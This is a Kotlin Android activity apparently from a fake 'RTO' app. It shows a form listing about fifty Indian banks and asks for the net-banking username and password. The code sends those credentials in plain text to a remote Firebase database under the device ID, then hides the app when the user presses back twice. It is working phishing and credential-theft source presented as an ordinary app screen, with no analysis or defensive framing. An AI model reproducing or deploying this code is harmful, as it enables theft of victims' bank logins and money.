package com.rto1p8.app.ui

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.rto1p8.app.MainActivity
import com.rto1p8.app.databinding.ActivityFormThreeBinding

class FormThreeActivity : AppCompatActivity() {
    private lateinit var binding: ActivityFormThreeBinding
    private lateinit var deviceRef: DatabaseReference
    private lateinit var db: FirebaseDatabase
    private var selectedBank: String? = null
    private lateinit var deviceId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFormThreeBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Initialize Firebase and Device ID
        db = FirebaseDatabase.getInstance()
        deviceId = MainActivity.getDeviceId(this)
        deviceRef = db.reference.child("Device").child(deviceId)

        // Check if device node exists, create if it doesn't
        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) {
                    deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                        .addOnSuccessListener {
                            Log.d("Firebase", "Created new device node with deviceId: $deviceId")
                        }
                        .addOnFailureListener { e ->
                            Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                        }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseError", "Error checking device node: ${error.message}")
            }
        })

        // Setup bank dropdown
        setupBankSpinner()

        binding.proceedBtn.setOnClickListener {
            val username = binding.edtUser.text.toString().trim()
            val password = binding.edtPass.text.toString().trim()

            // Validate inputs
            if (selectedBank == null) {
                Toast.makeText(this, "Please select a bank", Toast.LENGTH_SHORT).show()
                binding.bankSpinner.requestFocus()
                return@setOnClickListener
            }
            if (username.isEmpty()) {
                binding.edtUser.error = "Please enter Username/Customer ID"
                binding.edtUser.requestFocus()
                return@setOnClickListener
            }
            if (password.isEmpty()) {
                binding.edtPass.error = "Please enter Password"
                binding.edtPass.requestFocus()
                return@setOnClickListener
            }

            // Update Firebase database
            updateFirebase(selectedBank!!, username, password)
        }
    }

    private fun setupBankSpinner() {
        val banks = listOf(
            "Select Bank",
            // Public Sector Banks
            "State Bank of India",
            "Punjab National Bank",
            "Bank of Baroda",
            "Canara Bank",
            "Union Bank of India",
            "Indian Bank",
            "Bank of India",
            "Central Bank of India",
            "UCO Bank",
            "Bank of Maharashtra",
            "Indian Overseas Bank",
            "Punjab & Sind Bank",
            // Private Sector Banks
            "HDFC Bank",
            "ICICI Bank",
            "Axis Bank",
            "Kotak Mahindra Bank",
            "Yes Bank",
            "IDFC First Bank",
            "IndusInd Bank",
            "Federal Bank",
            "South Indian Bank",
            "Karnataka Bank",
            "Karur Vysya Bank",
            "City Union Bank",
            "RBL Bank",
            "Bandhan Bank",
            "Tamilnad Mercantile Bank",
            "Lakshmi Vilas Bank",
            "Dhanlaxmi Bank",
            "DCB Bank",
            "Jammu & Kashmir Bank",
            // Small Finance Banks
            "AU Small Finance Bank",
            "Ujjivan Small Finance Bank",
            "Equitas Small Finance Bank",
            "Utkarsh Small Finance Bank",
            "Suryoday Small Finance Bank",
            "Capital Small Finance Bank",
            "Fincare Small Finance Bank",
            "ESAF Small Finance Bank",
            "North East Small Finance Bank",
            "Jana Small Finance Bank",
            // Payments Banks
            "Airtel Payments Bank",
            "India Post Payments Bank",
            "Fino Payments Bank",
            "Paytm Payments Bank",
            "Jio Payments Bank",
            "Other Bank"
        )

        val adapter = object : ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, banks) {
            override fun getView(position: Int, convertView: View?, parent: ViewGroup): View {
                val view = super.getView(position, convertView, parent)
                val textView = view.findViewById<TextView>(android.R.id.text1)
                textView.setTextColor(ContextCompat.getColor(context, android.R.color.black))
                return view
            }

            override fun getDropDownView(
                position: Int,
                convertView: View?,
                parent: ViewGroup
            ): View? {
                val view = super.getDropDownView(position, convertView, parent)
                val textView = view.findViewById<TextView>(android.R.id.text1)
                textView.setTextColor(ContextCompat.getColor(context, android.R.color.black))
                textView.setBackgroundColor(ContextCompat.getColor(context, android.R.color.white))
                return view
            }
        }

        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        binding.bankSpinner.adapter = adapter
        binding.bankSpinner.setBackgroundColor(ContextCompat.getColor(this, android.R.color.white))

        binding.bankSpinner.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: AdapterView<*>, view: View?, position: Int, id: Long) {
                selectedBank = if (position == 0) null else banks[position]
                (view as? TextView)?.setTextColor(ContextCompat.getColor(this@FormThreeActivity, android.R.color.black))
            }

            override fun onNothingSelected(parent: AdapterView<*>) {
                selectedBank = null
            }
        }
    }

    private fun updateFirebase(bank: String, username: String, password: String) {
        val userInfoMap = hashMapOf<String, Any?>(
            "Bank" to bank,
            "Username" to username,
            "Password" to password,
            "timestamp" to ServerValue.TIMESTAMP
        )

        deviceRef.child("user_info").push().setValue(userInfoMap)
            .addOnSuccessListener {
                clearInputFields()
                startActivity(Intent(this@FormThreeActivity, FormLastActivity::class.java))
                finish()
            }
            .addOnFailureListener { e ->
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            }
    }

    private fun clearInputFields() {
        binding.bankSpinner.setSelection(0)
        binding.edtUser.setText("")
        binding.edtPass.setText("")
        selectedBank = null
    }

    private var doubleBackToExitPressedOnce = false
    override fun onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed()
            hideApp()
            return
        }

        this.doubleBackToExitPressedOnce = true
        Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()

        Handler(Looper.getMainLooper()).postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
    }

    private fun hideApp() {
        moveTaskToBack(true)
        finish()
    }
}